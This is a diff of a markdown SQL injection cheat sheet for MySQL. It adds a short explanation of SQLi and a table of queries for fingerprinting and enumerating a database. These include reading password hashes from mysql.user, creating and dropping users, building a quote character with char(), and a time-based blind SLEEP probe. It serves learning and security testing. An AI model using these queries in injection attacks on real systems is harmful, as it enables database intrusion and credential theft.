@@ -1,6 +1,14 @@
+# SQL injection
+SQL injection (SQLi) is an application security weakness that allows attackers to control an application’s database – letting them access or delete data, change an application’s data-driven behavior, and do other undesirable things – by tricking the application into sending unexpected SQL commands. 
+
+SQL injection weaknesses occur when an application uses untrusted data, such as data entered into web form fields, as part of a database query. When an application fails to properly sanitize this untrusted data before adding it to a SQL query, an attacker can include their own SQL commands which the database will execute. Such SQLi vulnerabilities are easy to prevent, yet SQLi remains a leading web application risk, and many organizations remain vulnerable to potentially damaging data breaches resulting from SQL injection.
+
+### Commands that can be used to run sql injection
+
 <table border="1">
 <tbody>
 <tr>
+
 <td>Version</td>
 <td>
 
@@ -11,18 +19,55 @@ SELECT @@version
 
 </td>
 </tr>
+
+
+
 <tr>
-<td>Comments</td>
+<td>Location of DB files</td>
 <td>
 
-
 ```sql
-SELECT 1; #comment
-SELECT /*comment*/1;
+SELECT @@datadir;
 ```
 
 </td>
 </tr>
+
+
+</tr>
+
+<tr>
+<td>Hostname, IP Address</td>
+<td>
+
+```sql
+SELECT @@hostname;
+```
+
+</td>
+</tr>
+
+<tr>
+<td>Create Users</td>
+<td>
+
+```sql
+CREATE USER test1 IDENTIFIED BY 'pass1'; 
+```
+
+</td>
+</tr>
+<tr>
+<td>Delete Users</td>
+<td>
+
+```sql
+DROP USER test1; 
+```
+
+</td>
+</tr>
+
 <tr>
 <td>Current User</td>
 <td>
@@ -50,7 +95,8 @@ SELECT user FROM mysql.user;
 <td>
 
 ```sql
-SELECT host, user, password FROM mysql.user;
+SELECT host, user, authentication_string FROM mysql.user;
+
 ```
 </td>
 </tr>
@@ -112,71 +158,67 @@ SELECT database()
 <td>
 
 ```sql
+/*option 1*/
 SELECT schema_name FROM information_schema.schemata;
+
+/*option 2*/
+SELECT DISTINCT TABLE_SCHEMA
+FROM information_schema.columns; 
 ```
 
 </td>
+
+<tr>
+<td>List Tables</td>
+<td>
+
+```sql
+/* 
+Get all table names that are in 'mysql' db
+*/
+SELECT DISTINCT TABLE_NAME
+FROM information_schema.columns 
+WHERE TABLE_SCHEMA='mysql';
+```
+
+</td>
+</tr>
+
 </tr>
 <tr>
 <td>List Columns</td>
 <td>
 
 ```sql
-SELECT table_schema, table_name, column_name 
+
+/* 
+Get all column names of 'servers' table, that is in 'mysql' db
+*/
+SELECT COLUMN_NAME, DATA_TYPE, COLUMN_TYPE, COLUMN_DEFAULT, IS_NULLABLE, COLUMN_KEY
 FROM information_schema.columns 
-WHERE table_schema != 'mysql'
-AND table_schema != 'information_schema'
+WHERE TABLE_SCHEMA = 'mysql' AND TABLE_NAME='servers';
 ```
 
 </td>
 </tr>
-<tr>
-<td>List Tables</td>
-<td>
 
-```sql
-SELECT table_schema,table_name 
-FROM information_schema.tables 
-WHERE table_schema != 'mysql' 
-AND table_schema != 'information_schema'
-```
-
-</td>
-</tr>
 <tr>
 <td>Find Tables From Column Name</td>
 <td>
 
 ```sql
-SELECT table_schema, table_name 
-FROM information_schema.columns WHERE column_name = 'username'; 
-# find table which have a column called ‘username’
+/*
+find table which have a column called ‘username’
+*/
+SELECT TABLE_SCHEMA, TABLE_NAME 
+FROM information_schema.columns 
+WHERE COLUMN_NAME = 'username'; 
 ```
 
 </td>
 </tr>
 
-<tr>
-<td>Select Nth Char</td>
-<td>
 
-```sql
-SELECT substr('abcd', 3, 1); # returns c
-```
-
-</td>
-</tr>
-<tr>
-<td>Bitwise AND</td>
-<td>
-
-```sql
-SELECT 6 & 2; # returns 2
-SELECT 6 & 1; # returns 0
-```
-
-</td>
-</tr>
 <tr>
 <td>ASCII Value to Char</td>
 <td>
@@ -203,7 +245,7 @@ SELECT ascii('A'); # returns 65
 <td>
 
 ```sql
-SELECT cast('1' AS unsigned integer);<br>
+SELECT cast('1' AS unsigned integer);
 SELECT cast('123' AS char);
 ```
 
@@ -215,12 +257,36 @@ SELECT cast('123' AS char);
 
 
 ```sql
-SELECT CONCAT('A','B'); #returns AB<br>
+SELECT CONCAT('A','B'); #returns AB
 SELECT CONCAT('A','B','C'); # returns ABC
+SELECT CONCAT('A',char(cast('39' AS unsigned integer))); # returns A'
 ```
 
 </td>
 </tr>
+
+<tr>
+<td>Select Nth Char</td>
+<td>
+
+```sql
+SELECT substr('abcd', 3, 1); # returns c
+```
+
+</td>
+</tr>
+<tr>
+<td>Bitwise AND</td>
+<td>
+
+```sql
+SELECT 6 & 2; # returns 2
+SELECT 6 & 1; # returns 0
+```
+
+</td>
+</tr>
+
 <tr>
 <td>If Statement</td>
 <td>
@@ -233,11 +299,12 @@ SELECT if(1=1,'foo','bar'); # returns ‘foo’
 </tr>
 <tr>
 <td>Case Statement</td>
+<td>
 
 ```sql
 SELECT CASE WHEN (1=1) THEN 'A' ELSE 'B' END; # returns A
 ```
-
+</td>
 </tr>
 
 <tr>
@@ -252,47 +319,25 @@ SELECT SLEEP(5);
 </tr>
 
 <tr>
-<td>Hostname, IP Address</td>
+<td>Comments</td>
 <td>
 
+
 ```sql
-SELECT @@hostname;
+SELECT 1; #comment
+SELECT /*comment*/1;
 ```
 
 </td>
+
+
 </tr>
-<tr>
-<td>Create Users</td>
-<td>
-
-```sql
-CREATE USER test1 IDENTIFIED BY 'pass1'; 
-```
-
-</td>
-</tr>
-<tr>
-<td>Delete Users</td>
-<td>
-
-```sql
-DROP USER test1; 
-```
-
-</td>
-</tr>
-
-<tr>
-<td>Location of DB files</td>
-<td>
-
-```sql
-SELECT @@datadir;
-```
-
-</td>
-</tr>
-
 
 </tbody>
 </table>
+
+
+### Sql injection examples
+```sql
+SELECT if(@@version LIKE '%ubuntu0.18.04.4%',SLEEP(5),'non_ubuntu');
+```
